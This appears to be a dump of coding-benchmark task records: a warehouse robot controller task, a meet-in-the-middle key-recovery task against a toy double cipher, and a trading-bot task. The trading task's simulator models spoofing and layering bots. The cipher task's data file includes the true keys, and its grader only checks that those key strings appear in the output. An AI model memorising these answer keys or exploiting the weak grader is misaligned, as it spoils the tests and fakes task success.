    assert collisions <= 5, f""Too many collisions: {collisions}""","{""test_robot_completes_deliveries"": 0.7, ""test_robot_avoids_collisions"": 0.3}","{""robot_controller.py"": ""#!/usr/bin/env python3\nimport requests\nimport time\nimport json\n\nclass RobotController:\n    def __init__(self, base_url='http://localhost:8080'):\n        self.base_url = base_url\n        self.robot_id = 'player'\n        \n    def get_state(self):\n        response = requests.get(f'{self.base_url}/state')\n        return response.json()\n    \n    def move(self, position):\n        data = {'robot_id': self.robot_id, 'position': position}\n        response = requests.post(f'{self.base_url}/move', json=data)\n        return response.json()\n    \n    def pickup(self, task_id):\n        data = {'robot_id': self.robot_id, 'task_id': task_id}\n        response = requests.post(f'{self.base_url}/pickup', json=data)\n        return response.json()\n    \n    def deliver(self):\n        data = {'robot_id': self.robot_id}\n        response = requests.post(f'{self.base_url}/deliver', json=data)\n        return response.json()\n    \n    def run(self):\n        \""\""\""Basic controller - moves randomly and times out with multiple tasks\""\""\""\n        print(\""Starting robot controller...\"")\n        \n        while True:\n            state = self.get_state()\n            tasks = state.get('tasks', [])\n            \n            if not tasks:\n                print(\""No tasks available\"")\n                time.sleep(1)\n                continue\n            \n            # Just take first task - no pathfinding\n            task = tasks[0]\n            print(f\""Working on task {task['id']}\"")\n            \n            # Move to pickup (basic movement, no obstacle avoidance)\n            current_pos = state['robots'][self.robot_id]['pos']\n            target = task['pickup']\n            \n            # Simple movement - one step at a time\n            while current_pos != target:\n                if current_pos[0] < target[0]:\n                    next_pos = (current_pos[0] + 1, current_pos[1])\n                elif current_pos[0] > target[0]:\n                    next_pos = (current_pos[0] - 1, current_pos[1])\n                elif current_pos[1] < target[1]:\n                    next_pos = (current_pos[0], current_pos[1] + 1)\n                else:\n                    next_pos = (current_pos[0], current_pos[1] - 1)\n                \n                result = self.move(list(next_pos))\n                if result['success']:\n                    current_pos = next_pos\n                else:\n                    print(f\""Movement failed: {result.get('error')}\"")\n                    time.sleep(0.5)  # This causes timeouts\n                \n                time.sleep(0.2)\n            \n            # Pickup\n            self.pickup(task['id'])\n            \n            # Move to dropoff\n            target = task['dropoff']\n            # ... similar basic movement\n            \n            time.sleep(5)  # Timeout issue\n\nif __name__ == '__main__':\n    controller = RobotController()\n    controller.run()"", ""warehouse_server.py"": ""#!/usr/bin/env python3\nimport json\nimport random\nimport threading\nimport time\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom typing import Dict, List, Tuple, Set\n\nclass WarehouseState:\n    def __init__(self):\n        self.grid_size = 20\n        self.robots = {\n            'player': {'pos': (0, 0), 'carrying': None, 'deliveries': 0, 'collisions': 0},\n            'robot1': {'pos': (19, 19), 'path': []},\n            'robot2': {'pos': (0, 19), 'path': []},\n            'robot3': {'pos': (19, 0), 'path': []},\n            'robot4': {'pos': (10, 10), 'path': []}\n        }\n        self.shelves = self._generate_shelves()\n        self.tasks = []\n        self.completed_tasks = []\n        self.lock = threading.Lock()\n        self.movement_log = []\n        self.start_time = time.time()\n        \n    def _generate_shelves(self) -> Set[Tuple[int, int]]:\n        shelves = set()\n        # Create shelf rows\n        for row in [3, 7, 11, 15]:\n            for col in range(2, 18, 3):\n                shelves.add((row, col))\n                shelves.add((row, col + 1))\n        return shelves\n    \n    def add_task(self, pickup: Tuple[int, int], dropoff: Tuple[int, int], priority: int = 1):\n        with self.lock:\n            task_id = len(self.tasks) + 1\n            self.tasks.append({\n                'id': task_id,\n                'pickup': pickup,\n                'dropoff': dropoff,\n                'priority': priority,\n                'status': 'pending',\n                'created_at': time.time()\n            })\n            return task_id\n    \n    def move_robot(self, robot_id: str, new_pos: Tuple[int, int]) -> Dict:\n        with self.lock:\n            if robot_id not in self.robots:\n                return {'success': False, 'error': 'Invalid robot ID'}\n            \n            x, y = new_pos\n            if not (0 <= x < self.grid_size and 0 <= y < self.grid_size):\n                return {'success': False, 'error': 'Position out of bounds'}\n            \n            if new_pos in self.shelves:\n                return {'success': False, 'error': 'Position blocked by shelf'}\n            \n            # Check for collisions\n            for rid, robot in self.robots.items():\n                if rid != robot_id and robot['pos'] == new_pos:\n                    if robot_id == 'player':\n                        self.robots['player']['collisions'] += 1\n                    self.movement_log.append({\n                        'time': time.time() - self.start_time,\n                        'robot': robot_id,\n                        'event': 'collision',\n                        'position': new_pos\n                    })\n                    return {'success': False, 'error': 'Collision with another robot'}\n            \n            old_pos = self.robots[robot_id]['pos']\n            self.robots[robot_id]['pos'] = new_pos\n            \n            self.movement_log.append({\n                'time': time.time() - self.start_time,\n                'robot': robot_id,\n                'from': old_pos,\n                'to': new_pos\n            })\n            \n            return {'success': True, 'position': new_pos}\n    \n    def pickup_item(self, robot_id: str, task_id: int) -> Dict:\n        with self.lock:\n            if robot_id != 'player':\n                return {'success': False, 'error': 'Only player can pickup'}\n            \n            robot = self.robots[robot_id]\n            if robot['carrying'] is not None:\n                return {'success': False, 'error': 'Already carrying an item'}\n            \n            task = next((t for t in self.tasks if t['id'] == task_id and t['status'] == 'pending'), None)\n            if not task:\n                return {'success': False, 'error': 'Task not found or not pending'}\n            \n            if robot['pos'] != task['pickup']:\n                return {'success': False, 'error': 'Not at pickup location'}\n            \n            robot['carrying'] = task_id\n            task['status'] = 'in_progress'\n            return {'success': True, 'task_id': task_id}\n    \n    def deliver_item(self, robot_id: str) -> Dict:\n        with self.lock:\n            if robot_id != 'player':\n                return {'success': False, 'error': 'Only player can deliver'}\n            \n            robot = self.robots[robot_id]\n            if robot['carrying'] is None:\n                return {'success': False, 'error': 'Not carrying any item'}\n            \n            task = next((t for t in self.tasks if t['id'] == robot['carrying']), None)\n            if not task:\n                return {'success': False, 'error': 'Task not found'}\n            \n            if robot['pos'] != task['dropoff']:\n                return {'success': False, 'error': 'Not at delivery location'}\n            \n            task['status'] = 'completed'\n            task['completed_at'] = time.time()\n            self.completed_tasks.append(task)\n            robot['carrying'] = None\n            robot['deliveries'] += 1\n            \n            return {'success': True, 'deliveries': robot['deliveries']}\n    \n    def get_state(self) -> Dict:\n        with self.lock:\n            return {\n                'robots': {k: {'pos': v['pos'], 'carrying': v.get('carrying')} for k, v in self.robots.items()},\n                'shelves': list(self.shelves),\n                'tasks': [t for t in self.tasks if t['status'] == 'pending'],\n                'player_stats': {\n                    'deliveries': self.robots['player']['deliveries'],\n                    'collisions': self.robots['player']['collisions']\n                }\n            }\n\nclass WarehouseHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/state':\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps(warehouse.get_state()).encode())\n        elif self.path == '/stats':\n            with warehouse.lock:\n                stats = {\n                    'total_deliveries': warehouse.robots['player']['deliveries'],\n                    'total_collisions': warehouse.robots['player']['collisions'],\n                    'pending_tasks': len([t for t in warehouse.tasks if t['status'] == 'pending']),\n                    'movement_log_size': len(warehouse.movement_log)\n                }\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps(stats).encode())\n        else:\n            self.send_error(404)\n    \n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        data = json.loads(post_data)\n        \n        if self.path == '/move':\n            result = warehouse.move_robot(data['robot_id'], tuple(data['position']))\n        elif self.path == '/pickup':\n            result = warehouse.pickup_item(data['robot_id'], data['task_id'])\n        elif self.path == '/deliver':\n            result = warehouse.deliver_item(data['robot_id'])\n        elif self.path == '/add_task':\n            task_id = warehouse.add_task(\n                tuple(data['pickup']),\n                tuple(data['dropoff']),\n                data.get('priority', 1)\n            )\n            result = {'success': True, 'task_id': task_id}\n        else:\n            self.send_error(404)\n            return\n        \n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps(result).encode())\n    \n    def log_message(self, format, *args):\n        pass  # Suppress default logging\n\ndef move_other_robots():\n    \""\""\""Simple movement patterns for other robots\""\""\""\n    patterns = {\n        'robot1': [(19, 19), (15, 19), (15, 15), (19, 15)],  # Square pattern\n        'robot2': [(0, 19), (5, 19), (5, 14), (0, 14)],      # Different square\n        'robot3': [(19, 0), (19, 5), (14, 5), (14, 0)],      # Another square\n        'robot4': [(10, 10), (10, 5), (5, 5), (5, 10)]       # Central square\n    }\n    \n    indices = {robot: 0 for robot in patterns}\n    \n    while True:\n        time.sleep(1.5)  # Move every 1.5 seconds\n        for robot_id, path in patterns.items():\n            idx = indices[robot_id]\n            next_pos = path[idx]\n            warehouse.move_robot(robot_id, next_pos)\n            indices[robot_id] = (idx + 1) % len(path)\n\ndef generate_initial_tasks():\n    \""\""\""Generate initial set of tasks\""\""\""\n    random.seed(42)  # For reproducibility\n    pickup_locations = [(1, 1), (18, 1), (1, 18), (18, 18), (9, 9)]\n    dropoff_locations = [(5, 5), (14, 14), (5, 14), (14, 5), (9, 1)]\n    \n    for i in range(30):\n        pickup = random.choice(pickup_locations)\n        dropoff = random.choice(dropoff_locations)\n        priority = random.choice([1, 1, 1, 2, 3])  # More low priority tasks\n        warehouse.add_task(pickup, dropoff, priority)\n\nif __name__ == '__main__':\n    warehouse = WarehouseState()\n    generate_initial_tasks()\n    \n    # Start robot movement thread\n    robot_thread = threading.Thread(target=move_other_robots, daemon=True)\n    robot_thread.start()\n    \n    # Start HTTP server\n    server = HTTPServer(('localhost', 8080), WarehouseHandler)\n    print(\""Warehouse server running on http://localhost:8080\"")\n    server.serve_forever()""}",2025-07-22T11:06:07.024342+00:00,2025-07-22T11:06:07.051659+00:00
draft_dp_b638f81b,hard,draft_dp_b638f81b,security,The double encryption scheme is vulnerable. Need a meet-in-the-middle attack for attack.py that recovers both 32-bit keys given the plaintext-ciphertext pairs in test_data.json. Use Redis to keep memory under 2GB.,security,python|security|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN apt-get update && apt-get install -y redis-server && rm -rf /var/lib/apt/lists/*

RUN pip install redis==5.0.1

COPY cipher.py /app/
COPY test_data.json /app/

# Create a startup script that starts Redis before bash
RUN echo '#!/bin/bash\nredis-server --daemonize yes\nsleep 2\nexec /bin/bash' > /start.sh && \
    chmod +x /start.sh

CMD [""/start.sh""]","import os
import json
import subprocess
import time

def test_meet_in_the_middle_attack_finds_keys():
    """"""Test that the attack correctly recovers both encryption keys.""""""
    # First check if attack.py exists
    assert os.path.exists('/app/attack.py'), ""attack.py not found""
    
    # Load test data
    with open('/app/test_data.json', 'r') as f:
        data = json.load(f)
    
    # Run the attack
    result = subprocess.run(['python', '/app/attack.py'], 
                          capture_output=True, text=True, timeout=300)
    
    assert result.returncode == 0, f""Attack failed with exit code {result.returncode}""
    
    # Check if keys are reported in output
    output = result.stdout.strip()
    true_k1 = data['true_keys']['k1']
    true_k2 = data['true_keys']['k2']
    
    assert str(true_k1) in output, f""Key k1={true_k1} not found in output""
    assert str(true_k2) in output, f""Key k2={true_k2} not found in output""

def test_redis_memory_usage_under_limit():
    """"""Test that Redis memory usage stays under 2GB during attack.""""""
    # Start Redis if not running
    subprocess.run(['redis-server', '--daemonize', 'yes'], capture_output=True)
    time.sleep(1)
    
    # Check Redis is responsive
    ping_result = subprocess.run(['redis-cli', 'ping'], capture_output=True, text=True)
    assert ping_result.returncode == 0 and 'PONG' in ping_result.stdout
    
    # Get memory info after attack
    info_result = subprocess.run(['redis-cli', 'info', 'memory'], 
                               capture_output=True, text=True)
    assert info_result.returncode == 0
    
    # Parse memory usage
    for line in info_result.stdout.splitlines():
        if line.startswith('used_memory:'):
            used_bytes = int(line.split(':')[1])
            used_gb = used_bytes / (1024**3)
            assert used_gb < 2.0, f""Memory usage {used_gb:.2f}GB exceeds 2GB limit""
            break","{""test_meet_in_the_middle_attack_finds_keys"": 0.7, ""test_redis_memory_usage_under_limit"": 0.3}","{""test_data.json"": ""{\n    \""plaintext_ciphertext_pairs\"": [\n        {\n            \""plaintext\"": 305419896,\n            \""ciphertext\"": 2835014658\n        },\n        {\n            \""plaintext\"": 2271560481,\n            \""ciphertext\"": 1650867445\n        },\n        {\n            \""plaintext\"": 1532495540,\n            \""ciphertext\"": 3889201204\n        }\n    ],\n    \""true_keys\"": {\n        \""k1\"": 1234567890,\n        \""k2\"": 987654321\n    }\n}"", ""cipher.py"": ""def encrypt(key, plaintext):\n    \""\""\""Simple 32-bit block cipher encryption.\""\""\""\n    key = key & 0xFFFFFFFF\n    plaintext = plaintext & 0xFFFFFFFF\n    \n    # Simple substitution-permutation network\n    state = plaintext ^ key\n    \n    # S-box substitution (4-bit chunks)\n    sbox = [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7]\n    result = 0\n    for i in range(8):\n        nibble = (state >> (i * 4)) & 0xF\n        result |= (sbox[nibble] << (i * 4))\n    state = result\n    \n    # Permutation\n    state = ((state & 0xFFFF0000) >> 16) | ((state & 0x0000FFFF) << 16)\n    state = ((state & 0xFF00FF00) >> 8) | ((state & 0x00FF00FF) << 8)\n    \n    # Final key addition\n    state = state ^ (key >> 16)\n    \n    return state & 0xFFFFFFFF\n\ndef decrypt(key, ciphertext):\n    \""\""\""Simple 32-bit block cipher decryption.\""\""\""\n    key = key & 0xFFFFFFFF\n    ciphertext = ciphertext & 0xFFFFFFFF\n    \n    # Reverse operations\n    state = ciphertext ^ (key >> 16)\n    \n    # Reverse permutation\n    state = ((state & 0xFF00FF00) >> 8) | ((state & 0x00FF00FF) << 8)\n    state = ((state & 0xFFFF0000) >> 16) | ((state & 0x0000FFFF) << 16)\n    \n    # Inverse S-box\n    inv_sbox = [14, 3, 4, 8, 1, 12, 10, 15, 7, 13, 9, 6, 11, 2, 0, 5]\n    result = 0\n    for i in range(8):\n        nibble = (state >> (i * 4)) & 0xF\n        result |= (inv_sbox[nibble] << (i * 4))\n    state = result\n    \n    # Final key removal\n    state = state ^ key\n    \n    return state & 0xFFFFFFFF\n\ndef double_encrypt(k1, k2, plaintext):\n    \""\""\""Double encryption: E(k2, E(k1, plaintext))\""\""\""\n    intermediate = encrypt(k1, plaintext)\n    return encrypt(k2, intermediate)\n\ndef double_decrypt(k1, k2, ciphertext):\n    \""\""\""Double decryption: D(k1, D(k2, ciphertext))\""\""\""\n    intermediate = decrypt(k2, ciphertext)\n    return decrypt(k1, intermediate)""}",2025-07-22T11:07:11.572511+00:00,2025-07-22T17:56:30.709333+00:00
draft_dp_b16f9bb0,extremely_hard,draft_dp_b16f9bb0,software-engineering,"Our trading bot is getting destroyed by market makers on the test exchange. Build a smarter strategy that detects their manipulation tactics (spoofing, layering, etc.) and avoids their traps while still making profitable trades. Need positive P&L over 1000 trades.",software-engineering,python|algorithms|networking,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy all the files
COPY exchange_simulator.py /app/
COPY trading_bot.py /app/
COPY run_trading.py /app/

# Install required packages
RUN pip install websockets pandas numpy

# Make scripts executable
RUN chmod +x *.py

# Set up the environment
ENV PYTHONUNBUFFERED=1","import os
import json
import subprocess
import time
import asyncio


def test_positive_pnl():
    """"""Test that the trading bot achieves positive P&L over 1000 trades.""""""
    # Start the exchange server in background
    server_proc = subprocess.Popen(
        ['python', '/app/run_trading.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Give server time to start
    time.sleep(2)
    
    # Start the trading bot
    bot_proc = subprocess.Popen(
        ['python', '/app/trading_bot.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Wait for completion or timeout
    try:
        server_proc.wait(timeout=300)  # 5 minutes max
    except subprocess.TimeoutExpired:
        server_proc.kill()
        bot_proc.kill()
        server_proc.wait()
        bot_proc.wait()
    
    # Check results file
    assert os.path.exists('/app/trading_results.json'), ""Trading results file not found""
    
    with open('/app/trading_results.json', 'r') as f:
        results = json.load(f)
    
    # Check positive P&L
    assert results['pnl'] > 0, f""P&L is negative: ${results['pnl']:.2f}""
    assert results['total_trades'] >= 1000, f""Not enough trades: {results['total_trades']}""


def test_trap_avoidance():
    """"""Test that the bot avoids more than 80% of market maker traps.""""""
    # Results should already exist from previous test
    assert os.path.exists('/app/trading_results.json'), ""Trading results file not found""
    
    with open('/app/trading_results.json', 'r') as f:
        results = json.load(f)
    
    # Check trap avoidance rate
    assert results['trap_avoidance_rate'] >= 0.8, \
        f""Trap avoidance rate too low: {results['trap_avoidance_rate']*100:.1f}%""
    
    # Also check Sharpe ratio as a quality metric
    assert results['sharpe_ratio'] > 1.0, \
        f""Sharpe ratio too low: {results['sharpe_ratio']:.2f}""","{""test_positive_pnl"": 0.5, ""test_trap_avoidance"": 0.5}","{""exchange_simulator.py"": ""#!/usr/bin/env python3\n\""\""\""Simulated exchange with market makers and legitimate traders.\""\""\""\n\nimport asyncio\nimport json\nimport random\nimport time\nfrom collections import deque\nfrom typing import Dict, List, Optional, Tuple\nimport numpy as np\n\n\nclass OrderBook:\n    def __init__(self):\n        self.bids = []  # [(price, quantity, order_id, trader_id)]\n        self.asks = []  # [(price, quantity, order_id, trader_id)]\n        self.last_price = 100.0\n        self.trade_history = deque(maxlen=1000)\n        \n    def add_order(self, side: str, price: float, quantity: int, order_id: str, trader_id: str):\n        order = (price, quantity, order_id, trader_id)\n        if side == 'BUY':\n            self.bids.append(order)\n            self.bids.sort(key=lambda x: -x[0])  # Sort descending\n        else:\n            self.asks.append(order)\n            self.asks.sort(key=lambda x: x[0])   # Sort ascending\n            \n    def cancel_order(self, order_id: str):\n        self.bids = [o for o in self.bids if o[2] != order_id]\n        self.asks = [o for o in self.asks if o[2] != order_id]\n        \n    def match_orders(self) -> List[Dict]:\n        trades = []\n        while self.bids and self.asks and self.bids[0][0] >= self.asks[0][0]:\n            bid = self.bids[0]\n            ask = self.asks[0]\n            \n            trade_qty = min(bid[1], ask[1])\n            trade_price = ask[0]  # Use ask price\n            \n            trade = {\n                'price': trade_price,\n                'quantity': trade_qty,\n                'buyer_id': bid[3],\n                'seller_id': ask[3],\n                'timestamp': time.time()\n            }\n            trades.append(trade)\n            self.trade_history.append(trade)\n            self.last_price = trade_price\n            \n            # Update quantities\n            if bid[1] == trade_qty:\n                self.bids.pop(0)\n            else:\n                self.bids[0] = (bid[0], bid[1] - trade_qty, bid[2], bid[3])\n                \n            if ask[1] == trade_qty:\n                self.asks.pop(0)\n            else:\n                self.asks[0] = (ask[0], ask[1] - trade_qty, ask[2], ask[3])\n                \n        return trades\n        \n    def get_snapshot(self) -> Dict:\n        return {\n            'bids': [(p, q) for p, q, _, _ in self.bids[:10]],\n            'asks': [(p, q) for p, q, _, _ in self.asks[:10]],\n            'last_price': self.last_price,\n            'timestamp': time.time()\n        }\n\n\nclass MarketMakerBot:\n    \""\""\""Adversarial market maker using various manipulation strategies.\""\""\""\n    \n    def __init__(self, bot_id: str, strategy: str):\n        self.bot_id = bot_id\n        self.strategy = strategy\n        self.orders = {}\n        self.position = 0\n        self.trap_active = False\n        self.trap_start_time = 0\n        \n    async def execute_strategy(self, orderbook: OrderBook, exchange):\n        if self.strategy == 'spoofer':\n            await self._spoof_orders(orderbook, exchange)\n        elif self.strategy == 'layering':\n            await self._layer_orders(orderbook, exchange)\n        elif self.strategy == 'momentum_ignition':\n            await self._momentum_ignition(orderbook, exchange)\n            \n    async def _spoof_orders(self, orderbook: OrderBook, exchange):\n        \""\""\""Place large fake orders to move the market, then cancel.\""\""\""\n        if random.random() < 0.1:  # 10% chance to spoof\n            # Place large fake orders\n            mid_price = orderbook.last_price\n            \n            # Create fake buy wall\n            for i in range(5):\n                price = mid_price - 0.05 - (i * 0.01)\n                qty = random.randint(1000, 2000)\n                order_id = f\""{self.bot_id}_spoof_{time.time()}_{i}\""\n                self.orders[order_id] = ('BUY', price, qty)\n                await exchange.place_order(self.bot_id, 'BUY', price, qty, order_id)\n            \n            # Wait briefly\n            await asyncio.sleep(random.uniform(0.5, 2.0))\n            \n            # Cancel all spoof orders\n            for order_id in list(self.orders.keys()):\n                if 'spoof' in order_id:\n                    await exchange.cancel_order(self.bot_id, order_id)\n                    del self.orders[order_id]\n                    \n    async def _layer_orders(self, orderbook: OrderBook, exchange):\n        \""\""\""Layer multiple orders at different price levels.\""\""\""\n        if random.random() < 0.15:\n            mid_price = orderbook.last_price\n            \n            # Layer sell orders\n            for i in range(10):\n                price = mid_price + 0.02 + (i * 0.005)\n                qty = random.randint(50, 150)\n                order_id = f\""{self.bot_id}_layer_{time.time()}_{i}\""\n                self.orders[order_id] = ('SELL', price, qty)\n                await exchange.place_order(self.bot_id, 'SELL', price, qty, order_id)\n                \n            # Set trap\n            self.trap_active = True\n            self.trap_start_time = time.time()\n            \n    async def _momentum_ignition(self, orderbook: OrderBook, exchange):\n        \""\""\""Create fake momentum to trigger other traders.\""\""\""\n        if random.random() < 0.08:\n            # Execute several small trades in one direction\n            for i in range(5):\n                if orderbook.asks:\n                    ask_price = orderbook.asks[0][0]\n                    order_id = f\""{self.bot_id}_momentum_{time.time()}_{i}\""\n                    await exchange.place_order(self.bot_id, 'BUY', ask_price + 0.01, 10, order_id)\n                await asyncio.sleep(0.1)\n                \n            # Then place opposite orders to profit\n            if orderbook.bids:\n                bid_price = orderbook.bids[0][0]\n                order_id = f\""{self.bot_id}_momentum_sell_{time.time()}\""\n                await exchange.place_order(self.bot_id, 'SELL', bid_price - 0.01, 50, order_id)\n\n\nclass LegitimateTrader:\n    \""\""\""Normal market participant.\""\""\""\n    \n    def __init__(self, trader_id: str):\n        self.trader_id = trader_id\n        self.position = 0\n        \n    async def trade(self, orderbook: OrderBook, exchange):\n        if random.random() < 0.3:\n            mid_price = orderbook.last_price\n            \n            # Random walk trading\n            if random.random() < 0.5:\n                # Buy\n                price = mid_price - random.uniform(0.01, 0.05)\n                qty = random.randint(10, 50)\n                order_id = f\""{self.trader_id}_buy_{time.time()}\""\n                await exchange.place_order(self.trader_id, 'BUY', price, qty, order_id)\n            else:\n                # Sell\n                price = mid_price + random.uniform(0.01, 0.05)\n                qty = random.randint(10, 50)\n                order_id = f\""{self.trader_id}_sell_{time.time()}\""\n                await exchange.place_order(self.trader_id, 'SELL', price, qty, order_id)\n\n\nclass SimulatedExchange:\n    def __init__(self):\n        self.orderbook = OrderBook()\n        self.clients = {}\n        self.market_makers = [\n            MarketMakerBot(\""MM1\"", \""spoofer\""),\n            MarketMakerBot(\""MM2\"", \""layering\""),\n            MarketMakerBot(\""MM3\"", \""momentum_ignition\"")\n        ]\n        self.legitimate_traders = [\n            LegitimateTrader(f\""TRADER_{i}\"") for i in range(5)\n        ]\n        self.trade_log = []\n        self.manipulation_log = []\n        self.running = False\n        \n    async def start(self):\n        self.running = True\n        # Start market activity\n        asyncio.create_task(self._run_market_makers())\n        asyncio.create_task(self._run_legitimate_traders())\n        \n    async def stop(self):\n        self.running = False\n        await asyncio.sleep(1)\n        \n    async def _run_market_makers(self):\n        while self.running:\n            for mm in self.market_makers:\n                await mm.execute_strategy(self.orderbook, self)\n            await asyncio.sleep(0.1)\n            \n    async def _run_legitimate_traders(self):\n        while self.running:\n            for trader in self.legitimate_traders:\n                await trader.trade(self.orderbook, self)\n            await asyncio.sleep(0.2)\n            \n    async def place_order(self, trader_id: str, side: str, price: float, quantity: int, order_id: str):\n        self.orderbook.add_order(side, price, quantity, order_id, trader_id)\n        trades = self.orderbook.match_orders()\n        \n        # Log trades\n        for trade in trades:\n            self.trade_log.append(trade)\n            \n            # Check if this was a trap\n            if trader_id not in [mm.bot_id for mm in self.market_makers]:\n                for mm in self.market_makers:\n                    if mm.trap_active and time.time() - mm.trap_start_time < 5:\n                        # Check if price moved against the trader\n                        if (side == 'BUY' and self.orderbook.last_price < price * 0.98) or \\\n                           (side == 'SELL' and self.orderbook.last_price > price * 1.02):\n                            self.manipulation_log.append({\n                                'type': 'trap_success',\n                                'victim': trader_id,\n                                'manipulator': mm.bot_id,\n                                'loss': abs(self.orderbook.last_price - price) * quantity\n                            })\n                            \n        # Broadcast to clients\n        await self._broadcast_update()\n        \n        return {'status': 'accepted', 'order_id': order_id, 'trades': trades}\n        \n    async def cancel_order(self, trader_id: str, order_id: str):\n        self.orderbook.cancel_order(order_id)\n        \n        # Log if this was a spoof\n        for mm in self.market_makers:\n            if trader_id == mm.bot_id and 'spoof' in order_id:\n                self.manipulation_log.append({\n                    'type': 'spoof_cancel',\n                    'manipulator': mm.bot_id,\n                    'timestamp': time.time()\n                })\n                \n        await self._broadcast_update()\n        return {'status': 'cancelled', 'order_id': order_id}\n        \n    async def _broadcast_update(self):\n        snapshot = self.orderbook.get_snapshot()\n        for client_id, ws in self.clients.items():\n            try:\n                await ws.send(json.dumps({\n                    'type': 'orderbook_update',\n                    'data': snapshot\n                }))\n            except:\n                pass\n                \n    async def connect_client(self, client_id: str, websocket):\n        self.clients[client_id] = websocket\n        # Send initial snapshot\n        await websocket.send(json.dumps({\n            'type': 'connected',\n            'data': {'client_id': client_id}\n        }))\n        \n    async def disconnect_client(self, client_id: str):\n        if client_id in self.clients:\n            del self.clients[client_id]\n            \n    def get_stats(self, trader_id: str) -> Dict:\n        \""\""\""Get trading statistics for a specific trader.\""\""\""\n        trades = [t for t in self.trade_log if t['buyer_id'] == trader_id or t['seller_id'] == trader_id]\n        traps = [m for m in self.manipulation_log if m.get('victim') == trader_id]\n        spoofs = [m for m in self.manipulation_log if m['type'] == 'spoof_cancel']\n        \n        # Calculate P&L\n        position = 0\n        cash = 0\n        for trade in trades:\n            if trade['buyer_id'] == trader_id:\n                position += trade['quantity']\n                cash -= trade['price'] * trade['quantity']\n            else:\n                position -= trade['quantity']\n                cash += trade['price'] * trade['quantity']\n                \n        # Mark to market\n        pnl = cash + position * self.orderbook.last_price\n        \n        # Calculate metrics\n        total_trades = len(trades)\n        trapped_trades = len(traps)\n        trap_avoidance_rate = 1 - (trapped_trades / max(total_trades, 1))\n        \n        # Simple Sharpe ratio calculation\n        if trades:\n            returns = []\n            for i in range(1, len(trades)):\n                r = (trades[i]['price'] - trades[i-1]['price']) / trades[i-1]['price']\n                returns.append(r)\n            if returns:\n                sharpe = np.mean(returns) / (np.std(returns) + 1e-6) * np.sqrt(252)\n            else:\n                sharpe = 0\n        else:\n            sharpe = 0\n            \n        return {\n            'total_trades': total_trades,\n            'pnl': pnl,\n            'position': position,\n            'trap_avoidance_rate': trap_avoidance_rate,\n            'trapped_trades': trapped_trades,\n            'sharpe_ratio': sharpe,\n            'spoofs_in_market': len(spoofs)\n        }\n\n\n# WebSocket server implementation\nasync def handle_client(websocket, path, exchange):\n    client_id = f\""CLIENT_{time.time()}\""\n    await exchange.connect_client(client_id, websocket)\n    \n    try:\n        async for message in websocket:\n            data = json.loads(message)\n            \n            if data['type'] == 'place_order':\n                result = await exchange.place_order(\n                    client_id,\n                    data['side'],\n                    data['price'],\n                    data['quantity'],\n                    data.get('order_id', f\""{client_id}_{time.time()}\"")\n                )\n                await websocket.send(json.dumps({\n                    'type': 'order_response',\n                    'data': result\n                }))\n                \n            elif data['type'] == 'cancel_order':\n                result = await exchange.cancel_order(client_id, data['order_id'])\n                await websocket.send(json.dumps({\n                    'type': 'cancel_response',\n                    'data': result\n                }))\n                \n    except Exception as e:\n        print(f\""Client error: {e}\"")\n    finally:\n        await exchange.disconnect_client(client_id)\n\n\nasync def run_exchange_server():\n    \""\""\""Run the exchange WebSocket server.\""\""\""\n    import websockets\n    \n    exchange = SimulatedExchange()\n    await exchange.start()\n    \n    async with websockets.serve(\n        lambda ws, path: handle_client(ws, path, exchange),\n        \""localhost\"",\n        8765\n    ):\n        print(\""Exchange server running on ws://localhost:8765\"")\n        # Run for a fixed duration for testing\n        await asyncio.sleep(3600)  # 1 hour\n        \n    await exchange.stop()\n    return exchange\n\n\nif __name__ == \""__main__\"":\n    # Run the exchange server\n    asyncio.run(run_exchange_server())"", ""trading_bot.py"": ""#!/usr/bin/env python3\n\""\""\""Trading bot for the test exchange.\""\""\""\n\nimport asyncio\nimport json\nimport websockets\nimport random\nfrom collections import deque\n\n\nclass TradingBot:\n    def __init__(self):\n        self.position = 0\n        self.cash = 100000  # Starting capital\n        self.trades = []\n        self.orderbook = {'bids': [], 'asks': []}\n        self.order_history = deque(maxlen=100)\n        \n    async def connect_and_trade(self, uri=\""ws://localhost:8765\""):\n        async with websockets.connect(uri) as websocket:\n            print(\""Connected to exchange\"")\n            \n            # Start trading loop\n            while len(self.trades) < 1000:\n                try:\n                    # Receive market data\n                    message = await asyncio.wait_for(websocket.recv(), timeout=0.1)\n                    data = json.loads(message)\n                    \n                    if data['type'] == 'orderbook_update':\n                        self.orderbook = data['data']\n                        await self.make_trading_decision(websocket)\n                        \n                    elif data['type'] == 'order_response':\n                        if data['data']['trades']:\n                            for trade in data['data']['trades']:\n                                self.trades.append(trade)\n                                \n                except asyncio.TimeoutError:\n                    # No message received, continue\n                    pass\n                except Exception as e:\n                    print(f\""Error: {e}\"")\n                    \n    async def make_trading_decision(self, websocket):\n        \""\""\""Simple trading logic - buys and sells randomly.\""\""\""\n        if random.random() < 0.1:  # Trade 10% of the time\n            if self.orderbook['bids'] and self.orderbook['asks']:\n                best_bid = self.orderbook['bids'][0][0]\n                best_ask = self.orderbook['asks'][0][0]\n                \n                # Random decision\n                if random.random() < 0.5:\n                    # Buy\n                    price = best_ask + 0.01\n                    quantity = random.randint(10, 50)\n                    await self.place_order(websocket, 'BUY', price, quantity)\n                else:\n                    # Sell\n                    price = best_bid - 0.01\n                    quantity = random.randint(10, 50)\n                    await self.place_order(websocket, 'SELL', price, quantity)\n                    \n    async def place_order(self, websocket, side, price, quantity):\n        order = {\n            'type': 'place_order',\n            'side': side,\n            'price': price,\n            'quantity': quantity\n        }\n        await websocket.send(json.dumps(order))\n        \n    def 